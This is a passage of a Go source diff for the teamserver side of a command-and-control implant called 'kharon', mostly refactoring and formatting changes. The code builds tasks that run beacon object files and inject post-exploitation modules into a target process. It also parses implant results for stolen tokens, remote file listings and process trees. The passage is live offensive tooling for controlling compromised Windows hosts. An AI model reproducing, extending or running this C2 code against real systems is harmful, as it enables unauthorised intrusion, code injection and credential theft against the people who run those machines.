 			taskData.Type = TYPE_JOB
 
-			wd, err := os.Getwd()
-			if err != nil {
-				panic(err)
+			wd, wdErr := os.Getwd()
+			if wdErr != nil {
+				panic(wdErr)
 			}
-
 			postex_path := filepath.Join(filepath.Dir(wd), "dist", "extenders", "agent_kharon", "src_modules")
 
 			bofFile, ok := args["bof_file"].(string)
@@ -2158,29 +1823,28 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("parameter 'bof' must be set")
 				goto RET
 			}
-
 			if strings.Contains(bofFile, "kharon_replace_folder") {
 				bofFile = strings.ReplaceAll(bofFile, "kharon_replace_folder", postex_path)
 			}
-
-			bofContent, err := base64.StdEncoding.DecodeString(bofFile)
+			var bofContent []byte
+			bofContent, err = base64.StdEncoding.DecodeString(bofFile)
 			if err != nil {
 				goto RET
 			}
 
-			var params []byte
 			paramData, ok := args["param_data"].(string)
 			if ok {
-				params, err = base64.StdEncoding.DecodeString(paramData)
-				if err != nil {
+				params, decErr := base64.StdEncoding.DecodeString(paramData)
+				if decErr != nil {
 					params = []byte(paramData)
 				}
+				array = []interface{}{TASK_EXEC_BOF, len(bofContent), bofContent, 0, len(params), params}
+			} else {
+				array = []interface{}{TASK_EXEC_BOF, len(bofContent), bofContent, 0, 0, params}
 			}
 
-			array = []interface{}{TASK_EXEC_BOF, len(bofContent), bofContent, 0, len(params), params}
 		case "postex":
 			taskData.Type = TYPE_JOB
-			// taskData.Sync = false   			
 
 			method := args["method"].(string)
 			pid := args["pid"].(float64)
@@ -2197,70 +1861,29 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			scContent, _ := base64.StdEncoding.DecodeString(scfile)
 
 			var params []byte
+			var decErr error
 			paramData, ok := args["param_data"].(string)
 			if ok {
-				params, err = base64.StdEncoding.DecodeString(paramData)
-				if err != nil {
+				params, decErr = base64.StdEncoding.DecodeString(paramData)
+				if decErr != nil {
 					params = []byte(paramData)
 				}
 			}
 
-			var bofData []byte
-			if !kharon_cfg.postex_handler.PostexLoaded {  
+			if !kharon_cfg.PostexHandler.PostexLoaded {
 				bofData, _ = LoadExtModule("src_core", "kit_postex", "x64")
 			}
 
-			bofArgs, _ := PackExtData(
+			bofArgs, _ = PackExtData(
 				int(method_n),
 				int(pid),
 				scContent,
 				params,
 			)
 
-			array = []interface{}{ TASK_POSTEX, POSTEX_ACTION_INJECT, len(bofData), bofData, len(bofArgs), bofArgs,}
-
-			// case "kill": id := args["id"].(int) array = []interface{}{TASK_POSTEX, POSTEX_KILL, PackInt32(id)}
-
-			// case "list": array = []interface{}{TASK_POSTEX, POSTEX_LIST}
-
-			// case "cleanup": array = []interface{}{TASK_POSTEX, POSTEX_CLEANUP}
+			array = []interface{}{TASK_POSTEX, POSTEX_ACTION_INJECT, len(bofData), bofData, len(bofArgs), bofArgs}
 		}
 
-	// case "dotnet": 
-	// 	wd, err := os.Getwd()
-	// 	if err != nil {
-	// 		goto RET
-	// 	}
-
-	// 	mod_content, err := os.ReadFile(fmt.Sprintf("%s/dist/extenders/agent_kharon/src_modules/postex_sc/dotnet_ldr/dotnet_assembly.x64.bin", wd))
-	// 	if err != nil {
-	// 		goto RET
-	// 	}
-
-		// dotnet_file := args["sc_file"].(string)
-
-		// method_n := 0
-		// switch method {
-		// case "explicit":
-		// 	method_n = 0x100
-		// case "spawn":
-		// 	method_n = 0x200
-		// }
-
-		// dotnet_content, _ := base64.StdEncoding.DecodeString(dotnet_file)
-
-		// switch subcommand {
-		// case "inline":
-		// 	method_n = 0x000
-
-		// case "spawn":
-		// 	method_n = 0x200
-
-		// case "explicit":
-		// 	method_n = 0x100
-		// }
-
-	
 	default:
 		err = errors.New(fmt.Sprintf("Command '%v' not found", command))
 		goto RET
@@ -2271,26 +1894,22 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 		goto RET
 	}
 
-	/// END CODE
-
 	fmt.Printf("tasking command: %s | sub command: %s\n", command, subcommand)
+
 RET:
+	fmt.Printf("err %v\n", err)
+
 	return taskData, messageData, err
 }
-
 func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskData, packedData []byte) []ax.TaskData {
 	var outTasks []ax.TaskData
 
 	/// START CODE
 	var kharon_cfg KharonData
-	
-	err := kharon_cfg.Unmarshal(agentData.CustomData)
-	if err != nil {
-		fmt.Printf("ERROR: %v\n", err)
-		return outTasks
-	}
 
-	packer := CreatePacker( packedData )
+	kharon_cfg.JsonUnmarshal(&agentData)
+
+	packer := CreatePacker(packedData)
 
 	// Print packedData
 	// fmt.Printf("=== PACKED DATA DEBUG ===\n")
@@ -2308,7 +1927,7 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 	for taskIndex := uint(0); taskIndex < taskCount && packer.CheckPacker([]string{"int"}); taskIndex++ {
 		dataType := packer.ParseInt32()
 
-		if dataType == uint(MSG_QUICK) || dataType == uint(MSG_OUT) { 
+		if dataType == uint(MSG_QUICK) || dataType == uint(MSG_OUT) {
 			if len(packer.buffer) < 16 {
 				return outTasks
 			}
@@ -2321,7 +1940,7 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 			task.TaskId = TaskUID[:8]
 
 			if dataType == 0x7 && packer.CheckPacker([]string{"int"}) {
-				packer.ParseInt32() 
+				packer.ParseInt32()
 			}
 
 			if false == packer.CheckPacker([]string{"int", "array"}) {
@@ -2395,6 +2014,11 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 				task.MessageType = MESSAGE_SUCCESS
 				task.Message = "BOF download"
 				task.ClearText = fmt.Sprintf("Saved %s (%d bytes)", filename, len(data))
+
+			case CALLBACK_INFO:
+				task.MessageType = MESSAGE_INFO
+				task.Message = packer.ParseString()
+			
 			default:
 				output := packer.ParseString()
 
@@ -2562,7 +2186,7 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 										task.Message = fmt.Sprintf("Token %v (handle %v) from process [%v] in host [%v] successfully stolen: %v", tokenId, handle, pid, host, user)
 									}
 								}
-							}  
+							}
 
 						case TOKEN_USE:
 							if cmd_packer.CheckPacker([]string{"int"}) {
@@ -2692,27 +2316,27 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 					case POSTEX_ACTION_INJECT:
 						success := cmd_packer.ParseInt32()
 						if success == 1 {
-							kharon_cfg.postex_handler.PostexLoaded = true
+							kharon_cfg.PostexHandler.PostexLoaded = true
 						}
 						agentData.CustomData, _ = kharon_cfg.Marshal()
 						ts.TsAgentUpdateData(agentData)
 
-						task.Completed = false        
-						
-						ts.TsAgentConsoleOutput( task.AgentId, MESSAGE_SUCCESS, "Postex module successfully injected", "", false )
-						ts.TsAgentConsoleOutput( task.AgentId, MESSAGE_SUCCESS, "Kharon will try to read during the next check-in", "", false )
+						task.Completed = false
+
+						ts.TsAgentConsoleOutput(task.AgentId, MESSAGE_SUCCESS, "Postex module successfully injected", "", false)
+						ts.TsAgentConsoleOutput(task.AgentId, MESSAGE_SUCCESS, "Kharon will try to read during the next check-in", "", false)
 
 					case POSTEX_ACTION_POLL:
 						postex_msg := cmd_packer.ParseInt32()
 
 						switch postex_msg {
 						case POSTEX_MSG_OUTPUT:
-							is_exit   := cmd_packer.ParseInt32()
+							is_exit := cmd_packer.ParseInt32()
 							exit_code := cmd_packer.ParseInt32()
-							output    := cmd_packer.ParseBytes()
+							output := cmd_packer.ParseBytes()
 
 							task.MessageType = MESSAGE_SUCCESS
-							task.ClearText   = ConvertCpToUTF8(string(output), agentData.ACP)
+							task.ClearText = ConvertCpToUTF8(string(output), agentData.ACP)
 
 							if is_exit == 1 {
 								task.Completed = true
@@ -2724,15 +2348,15 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 
 						case POSTEX_MSG_END:
 							exit_code := cmd_packer.ParseInt32()
-							task.Message     = fmt.Sprintf("Process terminated (exit: %d)", exit_code)
+							task.Message = fmt.Sprintf("Process terminated (exit: %d)", exit_code)
 							task.MessageType = MESSAGE_SUCCESS
-							task.Completed   = true
+							task.Completed = true
 
 						case POSTEX_MSG_RAW:
 							output := cmd_packer.ParseBytes()
-							task.Message     = fmt.Sprintf("Raw output: %d bytes", len(output))
-							task.ClearText   = ConvertCpToUTF8(string(output), agentData.ACP)
-							task.Completed   = true
+							task.Message = fmt.Sprintf("Raw output: %d bytes", len(output))
+							task.ClearText = ConvertCpToUTF8(string(output), agentData.ACP)
+							task.Completed = true
 						default:
 							task.Completed = false
 						}
@@ -2743,12 +2367,12 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 					if cmd_id != 0 {
 						switch int(cmd_id) {
 						case FS_LIST:
-							if ! cmd_packer.CheckPacker([]string{"array"}) {
+							if !cmd_packer.CheckPacker([]string{"array"}) {
 								break
 							}
-							
+
 							root_path := ConvertWCharBytesToUTF8(cmd_packer.ParseBytes())
-							
+
 							type ls_data struct {
 								filename   string
 								size       uint
@@ -2766,25 +2390,25 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 								"array", "int", "int", "word", "word", "word", "word", "word",
 								"word", "word", "word", "word", "word", "word", "word", "word",
 								"word", "word", "word", "word", "word"}) {
-								
+
 								filename := ConvertWCharBytesToUTF8(cmd_packer.ParseBytes())
-								
+
 								ls_item := ls_data{
-									filename:   filename,
-									size:       cmd_packer.ParseInt32(),
-									attrib:     cmd_packer.ParseInt32(),
-									dir:        false,
-									createDate: fmt.Sprintf("%02d/%02d/%d %02d:%02d:%02d", 
-										cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), 
+									filename: filename,
+									size:     cmd_packer.ParseInt32(),
+									attrib:   cmd_packer.ParseInt32(),
+									dir:      false,
+									createDate: fmt.Sprintf("%02d/%02d/%d %02d:%02d:%02d",
+										cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(),
 										cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16()),
-									accessDate: fmt.Sprintf("%02d/%02d/%d %02d:%02d:%02d", 
-										cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), 
+									accessDate: fmt.Sprintf("%02d/%02d/%d %02d:%02d:%02d",
+										cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(),
 										cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16()),
-									writeDate: fmt.Sprintf("%02d/%02d/%d %02d:%02d:%02d", 
-										cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), 
+									writeDate: fmt.Sprintf("%02d/%02d/%d %02d:%02d:%02d",
+										cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(),
 										cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16()),
 								}
-								
+
 								if ls_item.filename != "." && ls_item.filename != ".." {
 									if (ls_item.attrib & 0x10) != 0 {
 										ls_item.dir = true
@@ -2794,31 +2418,31 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 									}
 								}
 							}
-							
+
 							data_full := append(data_directory, data_files...)
-							
+
 							var ui_items []ax.ListingFileDataWin
-							
+
 							if len(data_full) == 0 {
 								task.Message = fmt.Sprintf("The '%s' directory is EMPTY", root_path)
 								task.MessageType = MESSAGE_INFO
 							} else {
-								OutputText := fmt.Sprintf(" %-8s %-14s %-23s %-23s %-23s  %s\n", 
+								OutputText := fmt.Sprintf(" %-8s %-14s %-23s %-23s %-23s  %s\n",
 									"Type", "Size", "Created", "Last Access", "Last Modified", "Name")
-								OutputText += fmt.Sprintf(" %-8s %-14s %-23s %-23s %-23s  %s", 
+								OutputText += fmt.Sprintf(" %-8s %-14s %-23s %-23s %-23s  %s",
 									"----", "---------", "-------------------", "-------------------", "-------------------", "----")
-								
+
 								for _, item := range data_full {
 									if item.dir {
-										OutputText += fmt.Sprintf("\n %-8s %-14s %-23s %-23s %-23s  %s", 
+										OutputText += fmt.Sprintf("\n %-8s %-14s %-23s %-23s %-23s  %s",
 											"dir", "", item.createDate, item.accessDate, item.writeDate, item.filename)
 									} else {
-										OutputText += fmt.Sprintf("\n %-8s %-14s %-23s %-23s %-23s  %s", 
+										OutputText += fmt.Sprintf("\n %-8s %-14s %-23s %-23s %-23s  %s",
 											"", SizeBytesToFormat(int64(item.size)), item.createDate, item.accessDate, item.writeDate, item.filename)
 									}
-									
+
 									t, _ := time.Parse("01/02/2006 15:04:05", item.writeDate)
-									
+
 									fileData := ax.ListingFileDataWin{
 										IsDir:    item.dir,
 										Size:     int64(item.size),
@@ -2827,12 +2451,12 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 									}
 									ui_items = append(ui_items, fileData)
 								}
-								
+
 								task.Message = fmt.Sprintf("List of files in the '%s' directory", root_path)
 								task.ClearText = OutputText
 								task.MessageType = MESSAGE_SUCCESS
 							}
-							
+
 							SyncBrowserFiles(ts, task, root_path, ui_items)
 
 						case PROC_LIST:
@@ -2870,9 +2494,9 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 
 							var proclist []ax.ListingProcessDataWin
 
-							if len( ps_data_list ) > 0 {
+							if len(ps_data_list) > 0 {
 								ctx_max_size := 10
-								ps_max_size  := 20
+								ps_max_size := 20
 
 								for _, item := range ps_data_list {
 									proc_data := ax.ListingProcessDataWin{
@@ -2886,16 +2510,16 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 									if item.user != "N\\A" {
 										proc_data.Context = item.user
 
-										if len( proc_data.Context ) > ctx_max_size {
-											ctx_max_size = len( proc_data.Context )
+										if len(proc_data.Context) > ctx_max_size {
+											ctx_max_size = len(proc_data.Context)
 										}
 									}
 
-									if len( proc_data.ProcessName ) > ps_max_size {
-										ps_max_size = len( proc_data.ProcessName )
+									if len(proc_data.ProcessName) > ps_max_size {
+										ps_max_size = len(proc_data.ProcessName)
 									}
 
-									proclist = append( proclist, proc_data )
+									proclist = append(proclist, proc_data)
 								}
 
 								type TreeProc struct {
@@ -2915,9 +2539,9 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 									if node.Data.ppid == 0 || node.Data.pid == node.Data.ppid {
 										roots = append(roots, node)
 									} else if parent, ok := procMap[node.Data.ppid]; ok {
-										parent.Children = append( parent.Children, node )
+										parent.Children = append(parent.Children, node)
 									} else {
-										roots = append( roots, node ) 
+										roots = append(roots, node)
 									}
 								}
 
@@ -2983,38 +2607,41 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 
 							SyncBrowserProcess(ts, task, proclist)
 						case PROC_RUN:
-							if ( cmd_packer.CheckPacker([]string{"int", "int"}) )  {
+							if cmd_packer.CheckPacker([]string{"int", "int"}) {
 								pid := cmd_packer.ParseInt32()
 								tid := cmd_packer.ParseInt32()
 
 								task.Message = fmt.Sprintf("Process created with pid %d and tid %d\n", pid, tid)
 
-								if ( cmd_packer.CheckPacker([]string{"array"}) ) {
-									ps_output := ConvertCpToUTF8( string(cmd_packer.ParseBytes()), agentData.ACP)
+								if cmd_packer.CheckPacker([]string{"array"}) {
+									ps_output := ConvertCpToUTF8(string(cmd_packer.ParseBytes()), agentData.ACP)
 
 									fmt.Println(hex.Dump([]byte(ps_output)))
 
 									task.ClearText = ps_output
 								}
 							}
-						case TASK_CONFIG: {
-							exit_code := uint(0)
-							if cmd_packer.CheckPacker([]string{"int"}) {
-								exit_code = cmd_packer.ParseInt32()
-							}
+						case TASK_CONFIG:
+							{
+								exit_code := uint(0)
+								if cmd_packer.CheckPacker([]string{"int"}) {
+									exit_code = cmd_packer.ParseInt32()
+								}
 
-							if exit_code == 0 {
-								taskData.Message = "Config ended with success"
-							} else {
-								taskData.Message = fmt.Sprintf("Config ended with error") 
+								task.MessageType = MESSAGE_SUCCESS
+
+								if exit_code == 0 {
+									ts.TsAgentConsoleOutput(task.AgentId, MESSAGE_SUCCESS, "Config ended with success", "", false)
+								} else {
+									ts.TsAgentConsoleOutput(task.AgentId, MESSAGE_SUCCESS, fmt.Sprintf("Config ended with error: %s", win32ErrorCodes[exit_code]), "", false)
+								}
+
+								task.Completed = true
 							}
-							
-							taskData.Completed = true
-						}
-						// case DOTNET_INLINE:
-						// case DOTNET_FORK:		
-						// case REFLECT_INLINE:					
-						// case REFLECT_FORK:
+							// case DOTNET_INLINE:
+							// case DOTNET_FORK:
+							// case REFLECT_INLINE:
+							// case REFLECT_FORK:
 						}
 					}
 					task.Completed = true
@@ -3245,4 +2872,3 @@ func TerminalWrite(terminalId int, data []byte) ([]byte, error) {
 func TerminalClose(terminalId int) ([]byte, error) {
 	return nil, errors.New("Function Remote Terminal not supported")
 }
- 
